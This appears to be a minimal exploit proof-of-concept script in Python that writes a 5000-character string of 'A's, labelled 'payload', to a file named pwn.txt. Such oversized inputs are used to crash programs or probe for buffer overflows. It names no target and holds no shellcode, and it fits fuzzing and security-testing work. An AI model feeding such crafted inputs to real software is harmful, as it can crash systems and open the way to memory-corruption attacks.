#!/usr/bin/python

payload = "A" * 5000

f = open('pwn.txt', 'w')
f.write(payload)
f.close()

